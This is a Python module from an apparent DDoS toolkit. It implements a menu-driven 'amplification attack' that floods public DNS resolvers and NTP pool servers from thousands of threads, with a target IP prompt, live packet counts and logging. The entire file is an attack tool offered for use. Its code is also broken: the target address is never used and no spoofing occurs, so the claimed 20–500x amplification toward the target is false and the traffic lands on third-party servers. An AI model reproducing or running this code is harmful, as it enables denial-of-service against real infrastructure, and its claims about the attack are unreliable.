import socket
import threading
import random
import time
from modules.utils import pcolor, resolve
from modules.logger import save_log

# Public DNS servers for amplification
DNS_SERVERS = [
    "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
    "9.9.9.9", "208.67.222.222", "208.67.220.220"
]

# DNS query for amplification
def dns_amp(target_ip, dns_server, stop, stats):
    # DNS query packet (small request, large response)
    query = bytes([
        0x00, 0x01,  # Transaction ID
        0x01, 0x00,  # Flags
        0x00, 0x01,  # Questions
        0x00, 0x00, 0x00, 0x00,  # Answer, Authority, Additional
        0x03, ord('w'), ord('w'), ord('w'),  # www
        0x06, ord('g'), ord('o'), ord('o'), ord('g'), ord('l'), ord('e'),  # google
        0x03, ord('c'), ord('o'), ord('m'),  # com
        0x00,  # End
        0x00, 0xff,  # QTYPE = ANY
        0x00, 0x01   # QCLASS = IN
    ])
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop.is_set():
        try:
            sock.sendto(query, (dns_server, 53))
            stats['p'] += 1
        except:
            stats['e'] += 1

# NTP amplification (stronger - 200-500x multiplier)
def ntp_amp(target_ip, ntp_server, stop, stats):
    # NTP monlist request
    packet = b'\x17\x00\x03\x2a' + b'\x00' * 4
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop.is_set():
        try:
            sock.sendto(packet, (ntp_server, 123))
            stats['p'] += 1
        except:
            stats['e'] += 1

def amp_attack():
    pcolor("b", "\n[ AMPLIFICATION ATTACK ]\n")
    print("1. DNS Amplification (20-50x multiplier)")
    print("2. NTP Amplification (200-500x multiplier)")
    
    choice = input("Select (1-2): ")
    
    target = input("Target IP: ")
    if not target.replace('.', '').isdigit():
        ip = resolve(target)
        if not ip:
            input("Press Enter...")
            return
    else:
        ip = target
    
    threads = int(input("Threads (2000): ") or 2000)
    duration = int(input("Duration (60 sec): ") or 60)
    
    if choice == "1":
        method = "DNS_AMP"
        servers = DNS_SERVERS
        attack_func = dns_amp
        pcolor("y", "[!] DNS amplification - sends 20-50x more traffic to target")
    else:
        method = "NTP_AMP"
        servers = ["0.pool.ntp.org", "1.pool.ntp.org", "2.pool.ntp.org", "time.google.com"]
        attack_func = ntp_amp
        pcolor("y", "[!] NTP amplification - sends 200-500x more traffic to target")
    
    print(f"\nTarget: {ip}")
    print(f"Amplification servers: {len(servers)}")
    print(f"Threads: {threads}")
    print(f"Duration: {duration}s")
    
    confirm = input("\nStart attack? (y/n): ")
    if confirm != 'y':
        return
    
    stop = threading.Event()
    stats = {'p': 0, 'e': 0}
    
    # Spread threads across multiple amplification servers
    for i in range(threads):
        server = servers[i % len(servers)]
        threading.Thread(target=attack_func, args=(ip, server, stop, stats), daemon=True).start()
    
    pcolor("g", f"\n[!] AMPLIFICATION ATTACK STARTED on {ip}")
    pcolor("y", "[!] Traffic is being amplified through public servers")
    start = time.time()
    
    try:
        while time.time() - start < duration:
            remaining = int(duration - (time.time() - start))
            print(f"\r[LIVE] Amplified packets: {stats['p']} | Errors: {stats['e']} | Time: {remaining}s    ", end="")
            time.sleep(1)
    except KeyboardInterrupt:
        pcolor("y", "\n[!] Stopping...")
    finally:
        stop.set()
        pcolor("g", f"\n\n[+] ATTACK FINISHED")
        print(f"Packets sent to amplifiers: {stats['p']}")
        print(f"Estimated traffic to target: {stats['p'] * 50}+ packets")
        save_log(ip, 53, method, threads, duration, stats['p'], stats['e'])
    
    input("\nPress Enter...")
